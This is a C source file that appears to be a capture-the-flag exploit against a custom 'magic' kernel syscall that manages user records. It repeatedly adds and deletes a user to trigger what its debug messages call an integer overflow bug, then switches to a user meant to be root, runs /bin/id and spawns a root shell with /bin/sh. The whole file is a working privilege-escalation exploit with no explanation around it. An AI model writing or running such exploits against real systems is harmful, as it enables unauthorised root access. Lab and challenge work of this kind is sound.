//#define _DEBUG

#include <sys/types.h>
#include <sys/syscall.h>

#ifdef _DEBUG
#include <stdio.h>
#endif

#define SYS_MAGIC 449

struct MagicUser;

typedef struct {
	uid_t val;
} kuid_t;

struct MagicUser {
    kuid_t uid;
    struct MagicUser** children;
    char username[64];
    char password[64];
};

typedef enum {
    MAGIC_ADD = 0,
    MAGIC_EDIT = 1,
    MAGIC_DELETE = 2,
    MAGIC_SWITCH = 3,
} MagicMode;

long user_add(
    const char* username,
    const char* password
)
{
    return syscall(SYS_MAGIC, MAGIC_ADD, username, password);
}

long user_delete(
    const char* username
)
{
    return syscall(SYS_MAGIC, MAGIC_DELETE, username);
}

long user_change(
    const char* username,
    const char* password
)
{
    return syscall(SYS_MAGIC, MAGIC_SWITCH, username, password);
}

int main() {

#ifdef _DEBUG
    printf("[+] Exploit started...\n");
    printf("[+] Triggering integer overflow bug...\n");
#endif

	const char username[64] = "harry";
    for (size_t i = 0; i < 65534; i++)
    {
        user_add(username, "");
        user_delete(username);
    }

#ifdef _DEBUG
    printf("[+] Adding root user...\n");
#endif
    user_add(username, "");

#ifdef _DEBUG
    printf("[+] Chaning to root user...\n");
#endif
    user_change(username, "");

#ifdef _DEBUG
    printf("[+] Checking...\n");
    system("/bin/id");
#endif

#ifdef _DEBUG
    printf("[+] Spawning root shell...\n");
#endif
    system("/bin/sh");

    return 0;
}